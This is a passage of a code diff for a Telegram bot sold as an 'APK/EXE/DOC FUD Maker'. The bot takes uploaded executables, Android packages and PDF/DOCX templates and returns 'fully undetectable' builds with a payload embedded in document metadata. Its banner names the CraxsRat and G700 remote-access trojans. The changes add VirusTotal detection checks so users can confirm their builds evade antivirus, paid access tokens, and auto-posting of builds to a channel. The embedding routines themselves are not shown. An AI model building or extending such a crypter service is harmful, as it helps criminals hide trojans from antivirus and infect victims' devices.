         result['hash_original'], result['hash_fud'],
+        vt_result['scan_id'] if vt_result else None,
+        vt_result['positives'] if vt_result else None,
+        vt_result['total'] if vt_result else None,
+        vt_result['link'] if vt_result else None,
         result['size_original'], result['size_fud'],
         'done'
     )
-    await update.message.reply_text(
-        f"✅ *FUD EXE Ready!*\n\nBuild #{build_id}\nSize: {result['size_fud']/1024:.1f} KB",
-        parse_mode='Markdown'
-    )
+
+    msg = f"✅ *FUD EXE Ready!*\n\n"
+    msg += f"📁 Build #{build_id}\n"
+    msg += f"📏 Original: {result['size_original'] / 1024:.1f} KB\n"
+    msg += f"📏 FUD: {result['size_fud'] / 1024:.1f} KB\n"
+
+    if vt_result:
+        status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+        msg += f"\n🛡️ *VirusTotal:* {status_icon} {vt_result['positives']}/{vt_result['total']} detections\n"
+        if vt_result['link']:
+            msg += f"🔗 [View Report]({vt_result['link']})"
+
+    await status_msg.edit_text(msg, parse_mode='Markdown')
+
     with open(result['file'], 'rb') as f:
         await update.message.reply_document(
             document=f,
-            filename=f"fud_{int(time.time())}.exe",
+            filename=f"fud_exe_{build_id}.exe",
             caption=f"🔥 FUD EXE #{build_id}"
         )
+
+    if CHANNEL_ID:
+        try:
+            channel_msg = f"🔥 *New FUD EXE*\n\nBuild #{build_id}\n{result['size_fud'] / 1024:.1f} KB"
+            if vt_result:
+                status_icon = "✅" if vt_result['clean'] else "⚠️" if vt_result['positives'] < 5 else "❌"
+                channel_msg += f"\n🛡️ {status_icon} {vt_result['positives']}/{vt_result['total']} detections"
+            await context.bot.send_message(chat_id=CHANNEL_ID, text=channel_msg, parse_mode='Markdown')
+        except:
+            pass
+
     shutil.rmtree(temp_dir, ignore_errors=True)
     if os.path.exists(result['file']):
         os.remove(result['file'])
     if maker.work_dir and os.path.exists(maker.work_dir):
         shutil.rmtree(maker.work_dir, ignore_errors=True)
+
+    return ConversationHandler.END
+
+async def handle_doc(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_id = str(user.id)
+    token = context.user_data.get('token')
+
+    if not token or not validate_token(token):
+        await update.message.reply_text("❌ Invalid token. Send /start.")
+        return ConversationHandler.END
+
+    doc = update.message.document
+    if not doc or not doc.file_name.endswith(('.pdf', '.docx')):
+        await update.message.reply_text("❌ Please send a PDF or DOCX template.")
+        return WAITING_DOC
+
+    status_msg = await update.message.reply_text("📄 *Processing Document...*\n\n⏳ Embedding payload...", parse_mode='Markdown')
+
+    temp_dir = tempfile.mkdtemp(dir=os.path.join(DATA_DIR, "temp"))
+    doc_path = os.path.join(temp_dir, doc.file_name)
+    file_obj = await context.bot.get_file(doc.file_id)
+    await file_obj.download_to_drive(doc_path)
+
+    if doc.file_name.endswith('.pdf'):
+        output_path = create_pdf_with_payload(doc_path)
+        file_ext = 'pdf'
+    else:
+        output_path = create_doc_with_payload(doc_path)
+        file_ext = 'docx'
+
+    with open(doc_path, 'rb') as f:
+        orig_hash = hashlib.sha256(f.read()).hexdigest()
+    with open(output_path, 'rb') as f:
+        fud_hash = hashlib.sha256(f.read()).hexdigest()
+
+    build_id = log_build(
+        user_id, user.username or "unknown", token,
+        'doc', doc.file_name,
+        orig_hash, fud_hash,
+        None, None, None, None,
+        os.path.getsize(doc_path), os.path.getsize(output_path),
+        'done'
+    )
+
+    await status_msg.edit_text(
+        f"✅ *FUD Document Ready!*\n\n"
+        f"📁 Build #{build_id}\n"
+        f"📦 {doc.file_name}\n"
+        f"📏 {os.path.getsize(output_path) / 1024:.1f} KB\n\n"
+        f"Payload embedded in metadata.",
+        parse_mode='Markdown'
+    )
+
+    with open(output_path, 'rb') as f:
+        await update.message.reply_document(
+            document=f,
+            filename=f"fud_doc_{build_id}.{file_ext}",
+            caption=f"📄 FUD Document #{build_id}"
+        )
+
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    if os.path.exists(output_path):
+        os.remove(output_path)
+
     return ConversationHandler.END
 
 async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('gen_token_step'):
         return ConversationHandler.END
+
     try:
         parts = update.message.text.strip().split()
         days = int(parts[0]) if len(parts) > 0 else 7
@@ -748,10 +1145,15 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
     except:
         await update.message.reply_text("❌ Invalid. Send: `days max_uses`")
         return WAITING_GENERATE_TOKEN
+
     username = update.effective_user.username or "admin"
     token, token_id = create_token(username, days, max_uses)
+
     await update.message.reply_text(
-        f"✅ *Token Generated!*\n\n🔑 `{token}`\n📅 {days} days\n🔄 {max_uses} uses\n🆔 {token_id}",
+        f"✅ *Token Generated!*\n\n"
+        f"🔑 `{token}`\n"
+        f"📅 {days} days\n"
+        f"🔄 {max_uses} uses\n",
         parse_mode='Markdown'
     )
     context.user_data['gen_token_step'] = False
@@ -760,6 +1162,7 @@ async def handle_generate_token(update: Update, context: ContextTypes.DEFAULT_TY
 async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('revoke_step'):
         return ConversationHandler.END
+
     token = update.message.text.strip()
     revoke_token(token)
     await update.message.reply_text(f"✅ Token `{token[:12]}...` revoked.")
@@ -767,53 +1170,73 @@ async def handle_revoke_token(update: Update, context: ContextTypes.DEFAULT_TYPE
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("❌ Cancelled. Send /start.")
+    context.user_data.clear()
+    await update.message.reply_text("❌ Cancelled. Send /start to begin.")
     return ConversationHandler.END
 
 # ============ BOT RUNNER ============
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
+
     async def bot_main():
         init_db()
         print("🤖 FUD Maker Bot starting...")
         print(f"👨‍💻 Developers: {', '.join(DEVELOPERS)}")
+        print(f"🛡️ VirusTotal: {'Enabled' if VT_API_KEY else 'Disabled'}")
+        print(f"📢 Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
+
         application = Application.builder().token(BOT_TOKEN).build()
+
         conv = ConversationHandler(
-            entry_points=[CommandHandler('start', start), CallbackQueryHandler(button_handler)],
+            entry_points=[
+                CommandHandler('start', start),
+                CommandHandler('help', help_command),
+                CallbackQueryHandler(button_handler)
+            ],
             states={
                 WAITING_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_token)],
                 WAITING_APK: [MessageHandler(filters.Document.APK, handle_apk)],
                 WAITING_EXE: [MessageHandler(filters.Document.ALL, handle_exe)],
+                WAITING_DOC: [MessageHandler(filters.Document.ALL, handle_doc)],
                 WAITING_GENERATE_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_generate_token)],
             },
             fallbacks=[CommandHandler('cancel', cancel)],
             per_message=False,
             per_chat=True
         )
+
         application.add_handler(conv)
+        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
+
+        print("🤖 Bot ready, polling...")
         await application.initialize()
         await application.start()
         await application.updater.start_polling()
+
         while True:
             await asyncio.sleep(1)
+
     try:
         loop.run_until_complete(bot_main())
     except Exception as e:
         print(f"❌ Bot error: {e}")
-        import traceback; traceback.print_exc()
+        import traceback
+        traceback.print_exc()
 
 # ============ MAIN ============
 if __name__ == '__main__':
     print("""
-    ╔══════════════════════════════════════════════════════════════════╗
-    ║   APK/EXE FUD Maker — Telegram Bot on Railway                 ║
-    ║   Token System | CraxsRat v7.1 + G700 v6.4 | EXE FUD         ║
-    ║   Developers: @benji_v1, @benji_v2                            ║
-    ╚══════════════════════════════════════════════════════════════════╝
+    ╔══════════════════════════════════════════════════════════════════════╗
+    ║   APK/EXE/DOC FUD Maker — Telegram Bot on Railway                 ║
+    ║   Token System | VT Scan | Document FUD | Channel Auto-Post        ║
+    ║   Developers: @benji_v1, @benji_v2                                ║
+    ╚══════════════════════════════════════════════════════════════════════╝
     """)
+
     def run_flask():
         port = int(os.environ.get("PORT", 8080))
         app.run(host='0.0.0.0', port=port)
+
     threading.Thread(target=run_flask, daemon=True).start()
     run_bot()
